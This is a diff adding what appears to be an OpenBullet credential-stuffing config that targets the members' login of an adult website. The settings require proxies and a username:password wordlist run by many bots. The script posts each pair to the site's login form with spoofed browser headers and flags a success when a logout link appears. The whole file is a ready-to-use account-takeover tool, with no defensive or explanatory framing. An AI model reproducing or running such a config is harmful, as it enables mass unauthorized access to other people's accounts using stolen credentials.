@@ -1,0 +1,46 @@
+[SETTINGS]
+{
+  "Name": "X-art.com ",
+  "SuggestedBots": 420,
+  "LastModified": "",
+  "AdditionalInfo": "fuck u",
+  "Author": "ur mum",
+  "Version": "69.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login_Post REQUEST POST "https://www.x-art.com/auth.form" 
+  CONTENT "rlm=Members+Area&for=https%253a%252f%252fwww%252ex%252dart%252ecom%252fmembers%252f&host_path=www.x-art.com&host_port=https&login_form=1&warning=&rmb=y&uid=<USER>&pwd=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.x-art.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Origin: https://www.x-art.com" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "Referer: https://www.x-art.com/members/" 
+  HEADER "Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "href=\"https://www.x-art.com/members/?show=logout\">" 
+  KEYCHAIN Failure OR 
+    KEY "<SOURCE>" DoesNotContain "href=\"https://www.x-art.com/members/?show=logout\">" 
+ 
